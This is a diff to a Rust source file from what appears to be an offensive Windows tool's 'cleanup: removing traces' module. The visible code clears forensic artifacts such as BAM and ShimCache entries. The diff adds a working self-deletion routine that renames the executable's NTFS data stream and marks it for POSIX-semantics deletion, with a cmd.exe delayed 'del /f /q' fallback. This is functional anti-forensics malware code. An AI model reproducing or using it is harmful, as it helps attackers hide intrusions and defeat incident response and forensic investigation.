@@ -1,10 +1,47 @@
 use std::env;
+use std::ffi::OsStr;
 use std::fs;
+use std::os::windows::ffi::OsStrExt;
 use std::path::{Path, PathBuf};
 use std::process::Command;
 
 use winreg::enums::*;
 use winreg::RegKey;
+
+#[allow(non_snake_case)]
+mod win {
+    use std::ffi::c_void;
+    pub type HANDLE = *mut c_void;
+    pub type BOOL = i32;
+    pub type DWORD = u32;
+    pub const DELETE: DWORD = 0x00010000;
+    pub const SYNCHRONIZE: DWORD = 0x00100000;
+    pub const FILE_SHARE_READ: DWORD = 0x1;
+    pub const FILE_SHARE_WRITE: DWORD = 0x2;
+    pub const FILE_SHARE_DELETE: DWORD = 0x4;
+    pub const OPEN_EXISTING: DWORD = 3;
+    pub const INVALID_HANDLE_VALUE: HANDLE = -1isize as HANDLE;
+    pub const FILE_RENAME_INFO: i32 = 3;
+    pub const FILE_DISPOSITION_INFO_EX: i32 = 21;
+    pub const FILE_DISPOSITION_FLAG_DELETE: DWORD = 0x1;
+    pub const FILE_DISPOSITION_FLAG_POSIX_SEMANTICS: DWORD = 0x2;
+
+    #[repr(C)]
+    pub struct FILE_DISPOSITION_INFO_EX_S {
+        pub flags: DWORD,
+    }
+
+    extern "system" {
+        pub fn CreateFileW(
+            name: *const u16, access: DWORD, share: DWORD, sa: *mut c_void,
+            disp: DWORD, flags: DWORD, template: HANDLE,
+        ) -> HANDLE;
+        pub fn CloseHandle(h: HANDLE) -> BOOL;
+        pub fn SetFileInformationByHandle(
+            h: HANDLE, class: i32, info: *const c_void, size: DWORD,
+        ) -> BOOL;
+    }
+}
 
 pub fn run() {
     eprintln!("[*] Cleanup: removing traces...");
@@ -21,6 +58,7 @@ pub fn run() {
     clean_bam(&exe_path);
     clean_shimcache();
     self_delete(&exe_path);
+    std::process::exit(0);
 }
 
 // ── 1. Delete our files ──────────────────────────────────────
@@ -157,35 +195,109 @@ fn clean_shimcache() {
     // not persist. Best we can do without parsing the binary blob.
 }
 
-// ── 6. Self-delete ───────────────────────────────────────────
+// ── 6. Self-delete via NTFS data stream rename ──────────────
+// Rename :$DATA to a random alternate stream, then mark for deletion.
+// The file disappears from disk while the process is still running.
+// Works on Windows 11 using FileDispositionInfoEx + POSIX semantics.
 
 fn self_delete(exe_path: &Path) {
-    let exe_str = exe_path.to_string_lossy();
+    unsafe {
+        let wide_path: Vec<u16> = OsStr::new(exe_path)
+            .encode_wide()
+            .chain(std::iter::once(0))
+            .collect();
 
-    // Overwrite our binary with zeros before deletion (anti-recovery)
-    if let Ok(metadata) = fs::metadata(exe_path) {
-        let size = metadata.len() as usize;
-        if let Ok(()) = fs::write(exe_path, vec![0u8; size.min(1024 * 1024)]) {
-            eprintln!("[+] Overwrote binary content");
+        // Step 1: Open with DELETE access
+        let h = win::CreateFileW(
+            wide_path.as_ptr(),
+            win::DELETE | win::SYNCHRONIZE,
+            win::FILE_SHARE_READ | win::FILE_SHARE_WRITE | win::FILE_SHARE_DELETE,
+            std::ptr::null_mut(),
+            win::OPEN_EXISTING,
+            0,
+            std::ptr::null_mut(),
+        );
+        if h == win::INVALID_HANDLE_VALUE {
+            eprintln!("[!] Self-delete: CreateFile failed (open)");
+            return;
         }
+
+        // Step 2: Rename :$DATA to a random alternate stream
+        let stream_name: Vec<u16> = OsStr::new(":X")
+            .encode_wide()
+            .collect();
+
+        #[repr(C)]
+        struct FileRenameInfo {
+            flags: u32,
+            root_directory: usize,
+            file_name_length: u32,
+            file_name: [u16; 64],
+        }
+        let mut rename_info = FileRenameInfo {
+            flags: 0,
+            root_directory: 0,
+            file_name_length: (stream_name.len() * 2) as u32,
+            file_name: [0u16; 64],
+        };
+        rename_info.file_name[..stream_name.len()].copy_from_slice(&stream_name);
+
+        if win::SetFileInformationByHandle(
+            h,
+            win::FILE_RENAME_INFO,
+            &rename_info as *const _ as *const _,
+            std::mem::size_of::<FileRenameInfo>() as u32,
+        ) == 0 {
+            eprintln!("[!] Self-delete: stream rename failed");
+            win::CloseHandle(h);
+            return;
+        }
+        win::CloseHandle(h);
+
+        // Step 3: Reopen and mark for deletion
+        let h = win::CreateFileW(
+            wide_path.as_ptr(),
+            win::DELETE | win::SYNCHRONIZE,
+            win::FILE_SHARE_READ | win::FILE_SHARE_WRITE | win::FILE_SHARE_DELETE,
+            std::ptr::null_mut(),
+            win::OPEN_EXISTING,
+            0,
+            std::ptr::null_mut(),
+        );
+        if h == win::INVALID_HANDLE_VALUE {
+            eprintln!("[!] Self-delete: CreateFile failed (delete)");
+            return;
+        }
+
+        let disp = win::FILE_DISPOSITION_INFO_EX_S {
+            flags: win::FILE_DISPOSITION_FLAG_DELETE | win::FILE_DISPOSITION_FLAG_POSIX_SEMANTICS,
+        };
+
+        if win::SetFileInformationByHandle(
+            h,
+            win::FILE_DISPOSITION_INFO_EX,
+            &disp as *const _ as *const _,
+            std::mem::size_of::<win::FILE_DISPOSITION_INFO_EX_S>() as u32,
+        ) == 0 {
+            eprintln!("[!] Self-delete: disposition failed, falling back to cmd");
+            win::CloseHandle(h);
+            // Fallback: cmd.exe delayed delete
+            let script = format!(
+                r#"/c choice /c y /n /d y /t 2 >nul & del /f /q "{}""#,
+                exe_path.to_string_lossy()
+            );
+            let _ = Command::new("cmd")
+                .args([&script])
+                .stdin(std::process::Stdio::null())
+                .stdout(std::process::Stdio::null())
+                .stderr(std::process::Stdio::null())
+                .spawn();
+            return;
+        }
+
+        win::CloseHandle(h);
+        eprintln!("[+] Self-deleted from disk (NTFS stream method)");
     }
-
-    // Spawn a detached cmd.exe that waits for us to exit, then deletes
-    // Uses /w flag style with choice for a clean delay
-    let script = format!(
-        r#"/c choice /c y /n /d y /t 2 >nul & del /f /q "{exe}" & choice /c y /n /d y /t 1 >nul & rmdir /q "{dir}" 2>nul"#,
-        exe = exe_str,
-        dir = exe_path.parent().map(|p| p.to_string_lossy()).unwrap_or_default(),
-    );
-
-    let _ = Command::new("cmd")
-        .args([&script])
-        .stdin(std::process::Stdio::null())
-        .stdout(std::process::Stdio::null())
-        .stderr(std::process::Stdio::null())
-        .spawn();
-
-    eprintln!("[+] Self-delete scheduled");
 }
 
 // ── Helpers ──────────────────────────────────────────────────
